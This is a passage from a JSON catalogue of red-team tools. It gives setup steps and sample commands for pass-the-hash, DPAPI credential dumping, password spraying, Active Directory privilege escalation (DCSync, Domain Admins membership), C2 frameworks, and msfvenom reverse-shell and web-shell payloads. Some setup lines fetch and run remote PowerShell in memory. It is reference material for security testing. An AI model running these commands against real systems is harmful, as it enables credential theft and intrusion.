    "details": "## Description\nInvoke-TheHash contains PowerShell functions for performing pass-the-hash attacks with WMI and SMB.\n\n## Setup\n```powershell\nIEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-WMIExec.ps1')\n```\n\n## Usage\nExecute commands on remote systems using NTLM hashes instead of plaintext passwords.\n\n## Useful Commands\n```powershell\n# WMI execution with hash\nInvoke-WMIExec -Target 10.10.10.10 -Username Administrator -Hash ntlmhash -Command \"whoami\"\n\n# SMB execution with hash\nInvoke-SMBExec -Target 10.10.10.10 -Username Administrator -Hash ntlmhash -Command \"whoami\"\n```\n\n## Alternatives\n- **Impacket psexec.py**\n- **CrackMapExec**",
    "source": "https://github.com/Kevin-Robertson/Invoke-TheHash",
    "binaries": null,
    "tags": [
      "credential access",
      "web"
    ]
  },
  {
    "name": "SharpDPAPI",
    "url": "https://github.com/GhostPack/SharpDPAPI",
    "cat": "red",
    "type": "tool",
    "desc": "DPAPI manipulation and credential extraction",
    "details": "## Description\nSharpDPAPI is a C# port of some DPAPI functionality from Mimikatz. It can decrypt DPAPI protected data like Chrome passwords, RDP credentials, and more.\n\n## Setup\nDownload binary or compile from source.\n\n## Usage\nExtract and decrypt credentials protected by Windows Data Protection API.\n\n## Useful Commands\n```cmd\n# Triage all decryptable data\nSharpDPAPI.exe triage\n\n# Decrypt Chrome credentials\nSharpDPAPI.exe chrome\n\n# Decrypt RDP credentials\nSharpDPAPI.exe rdg\n\n# Decrypt with masterkey\nSharpDPAPI.exe blob /target:encrypted.bin /masterkey:<key>\n```\n\n## Alternatives\n- **Mimikatz dpapi::***\n- **DonPAPI**",
    "source": "https://github.com/GhostPack/SharpDPAPI",
    "binaries": null,
    "tags": [
      "credential access",
      "scanning",
      "malware analysis"
    ]
  },
  {
    "name": "DonPAPI",
    "url": "https://github.com/login-securite/DonPAPI",
    "cat": "red",
    "type": "tool",
    "desc": "Remote DPAPI credential dumping",
    "details": "## Description\nDonPAPI is a tool to remotely extract credentials protected by DPAPI from multiple machines. It automates the process of extracting masterkeys and decrypting secrets.\n\n## Setup\n```bash\npip install donpapi\n```\n\n## Usage\nDump credentials from remote Windows machines using valid credentials.\n\n## Useful Commands\n```bash\n# Dump from single host\nDonPAPI domain/user:password@10.10.10.10\n\n# Dump from multiple hosts\nDonPAPI domain/user:password@10.10.10.0/24\n\n# Use NTLM hash\nDonPAPI -hashes :ntlmhash domain/user@10.10.10.10\n```\n\n## Alternatives\n- **SharpDPAPI**\n- **Mimikatz**",
    "source": "https://github.com/login-securite/DonPAPI",
    "binaries": null,
    "tags": [
      "credential access"
    ]
  },
  {
    "name": "sprayhound",
    "url": "https://github.com/Hackndo/sprayhound",
    "cat": "red",
    "type": "tool",
    "desc": "Password spraying with BloodHound integration",
    "details": "## Description\nsprayhound is a password spraying tool that creates a BloodHound-compatible JSON file with compromised accounts, allowing visualization of access paths in BloodHound.\n\n## Setup\n```bash\npip install sprayhound\n```\n\n## Usage\nPerform password spraying attacks and import results directly into BloodHound.\n\n## Useful Commands\n```bash\n# Spray with user list\nsprayhound -U users.txt -p Password123 -d domain.local -dc 10.10.10.10\n\n# Import to BloodHound\nsprayhound -U users.txt -p Password123 -d domain.local -dc 10.10.10.10 --bloodhound\n```\n\n## Alternatives\n- **Kerbrute**\n- **CrackMapExec**",
    "source": "https://github.com/Hackndo/sprayhound",
    "binaries": null,
    "tags": [
      "credential access",
      "active directory"
    ]
  },
  {
    "name": "windapsearch",
    "url": "https://github.com/ropnop/windapsearch",
    "cat": "red",
    "type": "tool",
    "desc": "LDAP enumeration from Linux",
    "details": "## Description\nwindapsearch is a Python script to enumerate users, groups, and computers from a Windows domain through LDAP queries.\n\n## Setup\n```bash\npip install python-ldap\ngit clone https://github.com/ropnop/windapsearch\n```\n\n## Usage\nPerform LDAP queries against Active Directory from Linux without domain join.\n\n## Useful Commands\n```bash\n# Enumerate users\npython windapsearch.py -d domain.local -u user -p password --dc 10.10.10.10 -U\n\n# Enumerate privileged users\npython windapsearch.py -d domain.local -u user -p password --dc 10.10.10.10 --privileged-users\n\n# Enumerate computers\npython windapsearch.py -d domain.local -u user -p password --dc 10.10.10.10 -C\n```\n\n## Alternatives\n- **ldapdomaindump**\n- **PowerView**",
    "source": "https://github.com/ropnop/windapsearch",
    "binaries": null,
    "tags": [
      "credential access",
      "active directory",
      "enumeration"
    ]
  },
  {
    "name": "krbrelayx",
    "url": "https://github.com/dirkjanm/krbrelayx",
    "cat": "red",
    "type": "tool",
    "desc": "Kerberos relay and unconstrained delegation abuse",
    "details": "## Description\nkrbrelayx is a toolkit for performing Kerberos relay attacks and exploiting unconstrained delegation. Part of the relaying attacks family.\n\n## Setup\n```bash\npip install dnspython ldap3 pyasn1\ngit clone https://github.com/dirkjanm/krbrelayx\n```\n\n## Usage\nPerform Kerberos-based relay attacks and exploit delegation configurations.\n\n## Useful Commands\n```bash\n# Perform DNS updates for relay\npython dnstool.py -u domain\\user -p password -r attacker.domain.local -a add -d 10.10.10.10 dc.domain.local\n\n# Start Kerberos relay\npython krbrelayx.py -hashes :ntlmhash\n```\n\n## Alternatives\n- **Rubeus**\n- **Impacket**",
    "source": "https://github.com/dirkjanm/krbrelayx",
    "binaries": null,
    "tags": [
      "exploitation",
      "credential access",
      "web"
    ]
  },
  {
    "name": "ADModule",
    "url": "https://github.com/samratashok/ADModule",
    "cat": "red",
    "type": "tool",
    "desc": "ActiveDirectory PowerShell module without RSAT",
    "details": "## Description\nADModule is the Microsoft ActiveDirectory PowerShell module extracted from RSAT. Can be used without installing RSAT on target machines.\n\n## Setup\n```powershell\nImport-Module .\\Microsoft.ActiveDirectory.Management.dll\nImport-Module .\\ActiveDirectory\\ActiveDirectory.psd1\n```\n\n## Usage\nPerform AD enumeration using native Microsoft cmdlets without installing RSAT.\n\n## Useful Commands\n```powershell\n# Get domain info\nGet-ADDomain\n\n# Get all users\nGet-ADUser -Filter *\n\n# Get domain admins\nGet-ADGroupMember -Identity \"Domain Admins\"\n\n# Get all computers\nGet-ADComputer -Filter *\n```\n\n## Alternatives\n- **PowerView**\n- **Native RSAT**",
    "source": "https://github.com/samratashok/ADModule",
    "binaries": null,
    "tags": [
      "enumeration"
    ]
  },
  {
    "name": "PowerUpSQL",
    "url": "https://github.com/NetSPI/PowerUpSQL",
    "cat": "red",
    "type": "tool",
    "desc": "SQL Server enumeration and exploitation",
    "details": "## Description\nPowerUpSQL is a PowerShell toolkit for attacking SQL Server. It includes functions for SQL Server discovery, weak configuration auditing, privilege escalation, and post exploitation.\n\n## Setup\npowershell\nImport-Module .\\PowerUpSQL.psd1\n\n\n## Usage\nEnumerate and exploit SQL Servers in AD environments, including SQL Server links for lateral movement.\n\n## Useful Commands\npowershell\n# Discover SQL Servers\nGet-SQLInstanceDomain | Get-SQLServerInfo\n\n# Test login with current context\nGet-SQLInstanceDomain | Get-SQLConnectionTest\n\n# Execute query\nGet-SQLQuery -Instance server\\instance -Query \"SELECT @@version\"\n\n# Exploit SQL Server links\nGet-SQLServerLinkCrawl -Instance server\\instance\n\n\n## Alternatives\n- Impacket mssqlclient.py\n- msdat",
    "source": "https://github.com/NetSPI/PowerUpSQL",
    "binaries": null,
    "tags": [
      "privilege escalation",
      "post-exploitation",
      "exploitation"
    ]
  },
  {
    "name": "Whisker",
    "url": "https://github.com/eladshamir/Whisker",
    "cat": "red",
    "type": "tool",
    "desc": "Shadow Credentials attack tool",
    "details": "## Description\nWhisker is a C# tool for taking over Active Directory user and computer accounts by manipulating their msDS-KeyCredentialLink attribute (Shadow Credentials attack).\n\n## Setup\nCompile from source or download binary.\n\n## Usage\nAdd shadow credentials to accounts you have WriteProperty permissions on, then authenticate using the certificate.\n\n## Useful Commands\ncmd\n# Add shadow credential\nWhisker.exe add /target:targetuser\n\n# List shadow credentials\nWhisker.exe list /target:targetuser\n\n# Remove shadow credential\nWhisker.exe remove /target:targetuser /deviceid:<deviceid>\n\n\n## Alternatives\n- pywhisker (Python version)",
    "source": "https://github.com/eladshamir/Whisker",
    "binaries": null,
    "tags": [
      "credential access",
      "active directory",
      "malware analysis"
    ]
  },
  {
    "name": "pywhisker",
    "url": "https://github.com/ShutdownRepo/pywhisker",
    "cat": "red",
    "type": "tool",
    "desc": "Shadow Credentials from Linux",
    "details": "## Description\npywhisker is a Python version of Whisker for exploiting Shadow Credentials from Linux.\n\n## Setup\nbash\npip install pywhisker\n\n\n## Usage\nManipulate msDS-KeyCredentialLink attribute from Linux to perform Shadow Credentials attacks.\n\n## Useful Commands\nbash\n# Add shadow credential\npywhisker.py -d domain.local -u user -p password --target targetuser --action add\n\n# List credentials\npywhisker.py -d domain.local -u user -p password --target targetuser --action list\n\n# Use generated certificate\nexport KRB5CCNAME=targetuser.ccache\n\n\n## Alternatives\n- Whisker (C#)",
    "source": "https://github.com/ShutdownRepo/pywhisker",
    "binaries": null,
    "tags": [
      "credential access"
    ]
  },
  {
    "name": "bloodyAD",
    "url": "https://github.com/CravateRouge/bloodyAD",
    "cat": "red",
    "type": "tool",
    "desc": "Active Directory privilege escalation framework",
    "details": "## Description\nbloodyAD is an Active Directory privilege escalation framework that automates the most common exploitation paths. It can modify AD objects and exploit ACL misconfigurations.\n\n## Setup\nbash\npip install bloodyAD\n\n\n## Usage\nExploit ACL paths and perform privilege escalation automatically in AD environments.\n\n## Useful Commands\nbash\n# Add user to group\nbloodyAD.py -d domain.local -u user -p password --host dc.domain.local add groupMember 'Domain Admins' targetuser\n\n# Change password\nbloodyAD.py -d domain.local -u user -p password --host dc.domain.local set password targetuser 'NewPassword123!'\n\n# Grant DCSync rights\nbloodyAD.py -d domain.local -u user -p password --host dc.domain.local add dcsync targetuser\n\n\n## Alternatives\n- PowerView\n- aclpwn",
    "source": "https://github.com/CravateRouge/bloodyAD",
    "binaries": null,
    "tags": [
      "privilege escalation",
      "post-exploitation",
      "exploitation"
    ]
  },
  {
    "name": "aced",
    "url": "https://github.com/garrettfoster13/aced",
    "cat": "red",
    "type": "tool",
    "desc": "DACL abuse and ACE manipulation",
    "details": "## Description\naced is a tool to parse and create ACEs with a valid SID in your domain. Helps in understanding and exploiting ACL misconfigurations.\n\n## Setup\nbash\npip install aced\n\n\n## Usage\nCreate and manipulate Access Control Entries for privilege escalation.\n\n## Useful Commands\nbash\n# Create ACE\naced -t user -d domain.local -u attacker -p password create --target targetuser --ace GenericAll\n\n# Restore ACE\naced -t user -d domain.local -u attacker -p password restore --target targetuser --file backup.json\n\n\n## Alternatives\n- bloodyAD\n- PowerView",
    "source": "https://github.com/garrettfoster13/aced",
    "binaries": null,
    "tags": [
      "privilege escalation",
      "post-exploitation",
      "credential access"
    ]
  },
  {
    "name": "targetedKerberoast",
    "url": "https://github.com/ShutdownRepo/targetedKerberoast",
    "cat": "red",
    "type": "tool",
    "desc": "Set SPN on users for targeted Kerberoasting",
    "details": "## Description\ntargetedKerberoast is a Python script that can set or reset a user's SPN, allowing targeted Kerberoasting attacks on accounts without pre-configured SPNs.\n\n## Setup\nbash\npip install targetedKerberoast\n\n\n## Usage\nExploit accounts where you have WriteProperty permissions by adding SPNs and Kerberoasting them.\n\n## Useful Commands\nbash\n# Add SPN and Kerberoast\npython targetedKerberoast.py -d domain.local -u attacker -p password -target targetuser\n\n# Specify custom SPN\npython targetedKerberoast.py -d domain.local -u attacker -p password -target targetuser --spn http/fake\n\n\n## Alternatives\n- Manual SPN manipulation\n- Rubeus",
    "source": "https://github.com/ShutdownRepo/targetedKerberoast",
    "binaries": null,
    "tags": [
      "exploitation",
      "credential access",
      "web"
    ]
  },
  {
    "name": "PowerView",
    "url": "https://github.com/PowerShellMafia/PowerSploit",
    "cat": "red",
    "type": "tool",
    "desc": "PowerShell Active Directory enumeration",
    "details": "## Description\nPowerView is a PowerShell tool to gain network situational awareness on Windows domains. Part of the PowerSploit framework.\n\n## Setup\n```powershell\nIEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')\n```\n\n## Usage\nRun from memory on Windows machines to enumerate AD objects, users, groups, GPOs, ACLs, and trust relationships.\n\n## Useful Commands\n```powershell\n# Get domain info\nGet-Domain\n\n# Find domain admin users\nGet-DomainUser -Properties samaccountname | Where-Object {$_.memberof -match 'Domain Admins'}\n\n# Find computers\nGet-DomainComputer -Properties dnshostname,operatingsystem\n\n# Find shares\nFind-DomainShare -CheckShareAccess\n```\n\n## Alternatives\n- **SharpView** (C# port)\n- **BloodHound**",
    "source": "https://github.com/PowerShellMafia/PowerSploit",
    "binaries": null,
    "tags": [
      "active directory",
      "enumeration",
      "scanning"
    ]
  },
  {
    "name": "Covenant",
    "url": "https://github.com/cobbr/Covenant",
    "cat": "red",
    "type": "tool",
    "desc": ".NET command and control framework",
    "details": "## Description\nCovenant is a .NET command and control framework that aims to highlight the attack surface of .NET, make the use of offensive .NET tradecraft easier, and serve as a collaborative command and control platform.\n\n## Setup\n```bash\ngit clone --recurse-submodules https://github.com/cobbr/Covenant\ncd Covenant/Covenant\ndotnet run\n```\n\n## Usage\nAccess the web interface to generate .NET-based implants (Grunts), create listeners, and execute tasks on compromised Windows systems.\n\n## Workflow\n1. Create Listener (HTTP/HTTPS/SMB)\n2. Generate Grunt implant\n3. Execute on target\n4. Interact via web UI\n\n## Alternatives\n- **Sliver**\n- **Mythic**",
    "source": "https://github.com/cobbr/Covenant",
    "binaries": null,
    "tags": [
      "post-exploitation",
      "enumeration",
      "web"
    ]
  },
  {
    "name": "Empire",
    "url": "https://github.com/BC-SECURITY/Empire",
    "cat": "red",
    "type": "tool",
    "desc": "Post-exploitation framework (PowerShell/Python)",
    "details": "## Description\nEmpire is a post-exploitation and adversary emulation framework built on PowerShell and Python agents. It provides a menu-driven interface for managing agents.\n\n## Setup\n```bash\ngit clone https://github.com/BC-SECURITY/Empire.git\ncd Empire\n./setup/install.sh\n```\n\n## Usage\nCreate listeners and deploy stagers/agents to compromised systems for post-exploitation activities.\n\n## Useful Commands\n```bash\n# Start Empire\n./empire\n\n# Inside Empire:\nlisteners\nuselistener http\nexecute\nusestager windows/launcher_bat\ngenerate\n```\n\n## Alternatives\n- **Covenant**\n- **Metasploit**",
    "source": "https://github.com/BC-SECURITY/Empire",
    "binaries": "https://github.com/BC-SECURITY/Empire/releases",
    "tags": [
      "post-exploitation",
      "exploitation",
      "web"
    ]
  },
  {
    "name": "Medusa",
    "url": "https://github.com/jmk-foofus/medusa",
    "cat": "red",
    "type": "tool",
    "desc": "Parallel network login brute forcer",
    "details": "## Description\nMedusa is a speedy, parallel, and modular login brute-forcer. It supports many services including AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NCP, NNTP, POP3, PostgreSQL, rexec, RDP, rlogin, rsh, SMTP, SNMP, SSHv2, SVN, Telnet, VmAuthd, and VNC.\n\n## Setup\n```bash\nsudo apt install medusa\n```\n\n## Usage\nSimilar to Hydra but with different optimization strategies. Good for targeted attacks against specific services.\n\n## Useful Commands\n```bash\n# SSH brute force\nmedusa -h 10.10.10.10 -u admin -P passwords.txt -M ssh\n\n# RDP brute force\nmedusa -h 10.10.10.10 -U users.txt -P passwords.txt -M rdp\n\n# Resume from previous session\nmedusa -h 10.10.10.10 -u admin -P passwords.txt -M ssh -Z h1.txt\n```\n\n## Alternatives\n- **Hydra**\n- **Ncrack**",
    "source": "https://github.com/jmk-foofus/medusa",
    "binaries": null,
    "tags": [
      "bruteforce",
      "enumeration",
      "web"
    ]
  },
  {
    "name": "Wfuzz",
    "url": "https://github.com/xmendez/wfuzz",
    "cat": "red",
    "type": "tool",
    "desc": "Web application fuzzer",
    "details": "## Description\nWfuzz is a tool designed for bruteforcing Web Applications. It can be used for finding resources not linked (directories, servlets, scripts, etc), bruteforce GET and POST parameters, bruteforce Forms parameters, and more.\n\n## Setup\n```bash\npip install wfuzz\n```\n\n## Usage\nUse FUZZ keyword as placeholder for injection points. Supports various encoders, filters, and payloads.\n\n## Useful Commands\n```bash\n# Directory bruteforce\nwfuzz -c -z file,wordlist.txt --hc 404 http://target.com/FUZZ\n\n# Parameter fuzzing\nwfuzz -c -z file,params.txt http://target.com/page?FUZZ=value\n\n# POST data fuzzing\nwfuzz -c -z file,wordlist.txt -d \"username=admin&password=FUZZ\" http://target.com/login\n```\n\n## Alternatives\n- **ffuf**\n- **Burp Intruder**",
    "source": "https://github.com/xmendez/wfuzz",
    "binaries": null,
    "tags": [
      "credential access",
      "enumeration",
      "fuzzing"
    ]
  },
  {
    "name": "Sn1per",
    "url": "https://github.com/1N3/Sn1per",
    "cat": "red",
    "type": "tool",
    "desc": "Automated pentest framework",
    "details": "## Description\nSn1per is an automated scanner that can be used during a penetration test to enumerate and scan for vulnerabilities. It integrates multiple tools and automates reconnaissance.\n\n## Setup\n```bash\ngit clone https://github.com/1N3/Sn1per\ncd Sn1per\nbash install.sh\n```\n\n## Usage\nRun against a target domain or IP to perform automated reconnaissance, scanning, and vulnerability detection.\n\n## Useful Commands\n```bash\n# Quick scan\nsniper -t example.com\n\n# Full reconnaissance\nsniper -t example.com -m stealth -o -re\n\n# Web application scan\nsniper -t example.com -m web\n```\n\n## Alternatives\n- **Legion**\n- **AutoRecon**",
    "source": "https://github.com/1N3/Sn1per",
    "binaries": null,
    "tags": [
      "enumeration",
      "scanning",
      "web"
    ]
  },
  {
    "name": "SSH Audit",
    "url": "https://github.com/jtesta/ssh-audit",
    "cat": "red",
    "type": "tool",
    "desc": "SSH server/client configuration audit",
    "details": "## Description\nssh-audit checks SSH server & client configuration for weak algorithms, keys, and other security issues.\n\n## Setup\n```bash\npip install ssh-audit\n```\n\n## Usage\nPoint it at an SSH server to receive a report on supported algorithms and their security rating.\n\n## Useful Commands\n```bash\n# Audit a server\nssh-audit 10.10.10.10\n```\n\n## Alternatives\n- **nmap** (ssh scripts)",
    "source": "https://github.com/jtesta/ssh-audit",
    "binaries": "https://github.com/jtesta/ssh-audit/releases",
    "tags": [
      "tool"
    ]
  },
  {
    "name": "Caldera",
    "url": "https://caldera.mitre.org/",
    "cat": "red",
    "type": "tool",
    "desc": "Adversary emulation (use for purple teaming)",
    "details": "## Description\nMITRE Caldera is a cyber security framework designed to easily automate adversary emulation, assist manual red teams, and automate incident response.\n\n## Setup\n```bash\ngit clone https://github.com/mitre/caldera.git --recursive\npip install -r requirements.txt\npython3 server.py\n```\n\n## Usage\nUse the web interface to deploy agents and run 'Operations' which are chains of attack steps (Abilities) mapped to the ATT&CK framework.\n\n## Workflow\n1. Login to Web Interface.\n2. Deploy an Agent.\n3. Create an Operation (Adversary Profile).\n\n## Alternatives\n- **Atomic Red Team**\n- **Prelude Operator**",
    "source": "https://github.com/mitre/caldera",
    "binaries": "https://github.com/mitre/caldera/releases",
    "tags": [
      "web",
      "incident response",
      "framework"
    ]
  },
  {
    "name": "NetExec (nxc)",
    "url": "https://github.com/Pennyw0rth/NetExec",
    "cat": "red",
    "type": "tool",
    "desc": "SMB/AD assessment framework",
    "details": "## Description\nNetExec (nxc) is a network exploitation tool that automates assessing the security of large Active Directory networks. It is the maintained successor to CrackMapExec.\n\n## Setup\n```bash\npipx install git+https://github.com/Pennyw0rth/NetExec\n```\n\n## Usage\nUse it to perform password spraying, enumerate users/shares, and execute commands across multiple hosts simultaneously.\n\n## Useful Commands\n```bash\n# Spray passwords\nnxc smb 10.10.10.0/24 -u users.txt -p Password123\n\n# Execute command\nnxc smb 10.10.10.10 -u user -p pass -x \"whoami\"\n```\n\n## Alternatives\n- **Impacket**",
    "source": "https://github.com/Pennyw0rth/NetExec",
    "binaries": "https://github.com/Pennyw0rth/NetExec/releases",
    "tags": [
      "exploitation",
      "credential access",
      "active directory"
    ]
  },
  {
    "name": "CrackMapExec (CME) (legacy)",
    "url": "https://github.com/byt3bl33d3r/CrackMapExec",
    "cat": "red",
    "type": "tool",
    "desc": "SMB/AD post-exploitation framework",
    "details": "## Description\nCrackMapExec was a popular post-exploitation tool for assessing Active Directory. It has been archived and replaced by NetExec.\n\n## Status\n**Legacy/Archived.** Please use **NetExec** instead.\n\n## Setup\n```bash\npip install crackmapexec\n```\n\n## Usage\nUsed for enumerating logged on users and spidering SMB shares, executing psexec style attacks, and more.\n\n## Alternatives\n- **NetExec** (Recommended)",
    "source": "https://github.com/byt3bl33d3r/CrackMapExec",
    "binaries": "https://github.com/byt3bl33d3r/CrackMapExec/releases",
    "tags": [
      "post-exploitation",
      "exploitation",
      "active directory"
    ]
  },
  {
    "name": "evil-winrm",
    "url": "https://github.com/Hackplayers/evil-winrm",
    "cat": "red",
    "type": "tool",
    "desc": "WinRM client for Windows administration",
    "details": "## Description\nevil-winrm is the ultimate WinRM shell for hacking/pentesting. It allows you to obtain a shell on Windows hosts with WinRM enabled.\n\n## Setup\n```bash\ngem install evil-winrm\n```\n\n## Usage\nConnect to a target using credentials or hashes. It supports file upload/download and loading PowerShell scripts in memory.\n\n## Useful Commands\n```bash\n# Connect with credentials\nevil-winrm -i 10.10.10.10 -u Administrator -p 'Password123'\n\n# Connect with Hash (Pass-the-Hash)\nevil-winrm -i 10.10.10.10 -u Administrator -H <NTLM Hash>\n```\n\n## Alternatives\n- **Enter-PSSession** (Windows Native)\n- **Impacket** (psexec)",
    "source": "https://github.com/Hackplayers/evil-winrm",
    "binaries": null,
    "tags": [
      "credential access",
      "forensics"
    ]
  },
  {
    "name": "ldapdomaindump",
    "url": "https://github.com/dirkjanm/ldapdomaindump",
    "cat": "red",
    "type": "tool",
    "desc": "Dump AD LDAP info",
    "details": "## Description\nldapdomaindump is a tool for dumping information from Active Directory via LDAP and converting it to human-readable formats (HTML/JSON).\n\n## Setup\n```bash\npip install ldapdomaindump\n```\n\n## Usage\nAuthenticate to LDAP and extract user list, groups, computers, and trust relationships.\n\n## Useful Commands\n```bash\n# Dump info to HTML files\nldapdomaindump -u 'DOMAIN\\User' -p 'Password' 10.10.10.10\n```\n\n## Alternatives\n- **BloodHound**\n- **Windapsearch**",
    "source": "https://github.com/dirkjanm/ldapdomaindump",
    "binaries": null,
    "tags": [
      "credential access",
      "active directory"
    ]
  },
  {
    "name": "ScoutSuite",
    "url": "https://github.com/nccgroup/ScoutSuite",
    "cat": "red",
    "type": "tool",
    "desc": "Multi-cloud security auditing",
    "details": "## Description\nScoutSuite is an open source multi-cloud security-auditing tool. It connects to the API of Cloud providers (AWS, Azure, GCP, etc.) and gathers configuration data for manual inspection.\n\n## Setup\n```bash\npip install scoutsuite\n```\n\n## Usage\nAuthenticate with your cloud CLI and run ScoutSuite to generate an HTML report highlighting risk areas.\n\n## Useful Commands\n```bash\n# Audit AWS (requires configured CLI)\nscout aws\n\n# Audit Azure\nscout azure --cli\n```\n\n## Alternatives\n- **Prowler**\n- **CloudSploit**",
    "source": "https://github.com/nccgroup/ScoutSuite",
    "binaries": null,
    "tags": [
      "cloud"
    ]
  },
  {
    "name": "Prowler",
    "url": "https://github.com/prowler-cloud/prowler",
    "cat": "red",
    "type": "tool",
    "desc": "AWS security auditing and checks",
    "details": "## Description\nProwler is an Open Source security tool to perform AWS security best practices assessments, audits, incident response, continuous monitoring, hardening and forensics readiness.\n\n## Setup\n```bash\npip install prowler\n```\n\n## Usage\nRun prowler from the CLI. It performs hundreds of checks covering CIS benchmarks, GDPR, HIPAA, etc.\n\n## Useful Commands\n```bash\n# Run all checks\nprowler aws\n\n# Run specific checks (e.g., S3)\nprowler aws --services s3\n```\n\n## Alternatives\n- **ScoutSuite**",
    "source": "https://github.com/prowler-cloud/prowler",
    "binaries": null,
    "tags": [
      "forensics",
      "incident response",
      "detection"
    ]
  },
  {
    "name": "Mindblowing",
    "url": "https://github.com/0x8e5afe/mindblowing",
    "cat": "red",
    "type": "tool",
    "desc": "Interactive pentest mind maps with zero build steps",
    "details": "## Description\nMindblowing provides offline-first interactive mind maps for Pentesting and Active Directory. It is useful for tracking progress and recalling commands during an engagement.\n\n## Setup\nNo installation required. \n1. Download or clone the repo.\n2. Open `index.html` in your browser.\n\n## Usage\nNavigate the mind map by clicking nodes. Use the checkboxes to mark progress and the side panel to copy commands.\n\n## Features\n- Click nodes to expand.\n- Checkboxes to mark progress.\n- Copyable commands in the side panel.\n\n## Alternatives\n- **XMind**\n- **Obsidian**",
    "source": "https://github.com/0x8e5afe/mindblowing",
    "binaries": null,
    "tags": [
      "active directory"
    ]
  },
  {
    "name": "Pwnsheet",
    "url": "https://github.com/0x8e5afe/pwnsheet",
    "cat": "red",
    "type": "tool",
    "desc": "Dynamic pentesting cheatsheets that turn Markdown notes into an interactive workspace",
    "details": "## Description\nPwnsheet turns static markdown notes into a dynamic workspace. It allows you to define variables (like Target IP) which automatically update all commands in the cheatsheet.\n\n## Setup\n```bash\ngit clone https://github.com/0x8e5afe/pwnsheet.git\ncd pwnsheet\npython3 -m http.server 8000\n# Open localhost:8000 in browser\n```\n\n## Usage\nEdit the underlying markdown files to add your own notes. Use the web interface to toggle checkboxes and copy pre-filled commands.\n\n## Alternatives\n- **PayloadsAllTheThings**",
    "source": "https://github.com/0x8e5afe/pwnsheet",
    "binaries": null,
    "tags": [
      "web",
      "reference"
    ]
  },
  {
    "name": "revshells",
    "url": "https://www.revshells.com/",
    "cat": "red",
    "type": "tool",
    "desc": "Reverse shell payload generator",
    "details": "## Description\nRevshells is a hosted (or self-hosted) web tool to quickly generate reverse shell commands for various languages and listener configurations.\n\n## Setup\nWeb-based tool. No setup required (hosted). \nFor offline use: Clone the repo and open `index.html`.\n\n## Usage\nSelect your target OS, desired language (Bash, Python, PowerShell), enter your IP/Port, and copy the generated one-liner.\n\n## Features\n- IP/Port auto-filling.\n- Shell encoding (Base64, URL).\n- Listener command generation.\n\n## Alternatives\n- **msfvenom**\n- **Shellerator**",
    "source": "https://github.com/0dayCTF/reverse-shell-generator",
    "binaries": null,
    "tags": [
      "exploitation",
      "scanning",
      "web"
    ]
  },
  {
    "name": "msfvenom",
    "url": "https://docs.metasploit.com/",
    "cat": "red",
    "type": "tool",
    "desc": "Payload generation utility",
    "details": "## Description\nmsfvenom is a standalone payload generator that comes with the Metasploit Framework. It is used to create and encode shellcode and binaries.\n\n## Setup\nIncluded with Metasploit Framework.\n\n## Usage\nSpecify the payload type, architecture, encoder, and output format to generate a malicious file.\n\n## Useful Commands\n```bash\n# Windows Reverse TCP Executable\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe\n\n# PHP Web Shell\nmsfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php\n```\n\n## Alternatives\n- **Veil**\n- **Sliver** (Generate Implant)",
    "source": "https://github.com/rapid7/metasploit-framework",
    "binaries": null,
    "tags": [
      "exploitation",
      "web",
      "network"
    ]
  },
  {
    "name": "shcheck",
    "url": "https://github.com/santoru/shcheck",
    "cat": "red",
    "type": "tool",
    "desc": "Shellshock vulnerability checker",
    "details": "## Description\nshcheck is a script to detect Shellshock vulnerabilities in CGI scripts and web-exposed Bash environments.\n\n## Setup\n```bash\ngit clone https://github.com/santoru/shcheck.git\n```\n\n## Usage\nPass a URL to the script. It sends crafted HTTP headers to check if the server is vulnerable to arbitrary command execution.\n\n## Useful Commands\n```bash\n# Check a URL\npython shcheck.py http://target.com/cgi-bin/test.cgi\n```\n\n## Alternatives\n- **nmap** (--script http-shellshock)",
    "source": "https://github.com/santoru/shcheck",
    "binaries": null,
    "tags": [
      "web"
    ]
  },
  {
    "name": "pspy",
    "url": "https://github.com/DominicBreuker/pspy",
    "cat": "red",
    "type": "tool",
    "desc": "Monitor processes without root (Linux)",
    "details": "## Description\npspy is a command-line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they happen.\n\n## Setup\n```bash\n# Download the static binary (upload to target)\nwget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64\nchmod +x pspy64\n```\n\n## Usage\nExecute on a Linux host to monitor real-time process creation events.\n\n## Useful Commands\n```bash\n./pspy64\n```\n\n## Alternatives\n- **auditd**",
    "source": "https://github.com/DominicBreuker/pspy",
    "binaries": "https://github.com/DominicBreuker/pspy/releases",
    "tags": [
      "web",
      "malware analysis"
    ]
  },
  {
    "name": "LinEnum",
    "url": "https://github.com/rebootuser/LinEnum",
    "cat": "red",
    "type": "tool",
    "desc": "Linux local enumeration script",
    "details": "## Description\nLinEnum is a shell script that enumerates system information, users, network info, and potential privilege escalation vectors on Linux.\n\n## Setup\n```bash\nwget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\nchmod +x LinEnum.sh\n```\n\n## Usage\nRun the script on the target machine. It performs a wide range of checks and outputs the results to stdout.\n\n## Useful Commands\n```bash\n./LinEnum.sh -t\n```\n\n## Alternatives\n- **LinPEAS**",
    "source": "https://github.com/rebootuser/LinEnum",
    "binaries": null,
    "tags": [
      "post-exploitation",
      "privilege escalation",
      "exploitation"
    ]
  },
  {
    "name": "Linux Exploit Suggester",
    "url": "https://github.com/mzet-/linux-exploit-suggester",
    "cat": "red",
    "type": "tool",
    "desc": "Suggest kernel exploits based on version",
    "details": "## Description\nLinux Exploit Suggester is a script that assesses the kernel version and running processes to suggest possible public exploits.\n\n## Setup\n```bash\nwget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh\nchmod +x les.sh\n```\n\n## Usage\nRun it directly on the target or feed it the output of `uname -a` locally.\n\n## Useful Commands\n```bash\n# Run on target\n./les.sh\n\n# Run locally with 'uname -a' input\n./les.sh --uname \"Linux target 4.4.0...\"\n```\n\n## Alternatives\n- **Searchsploit**",
    "source": "https://github.com/mzet-/linux-exploit-suggester",
    "binaries": null,
    "tags": [
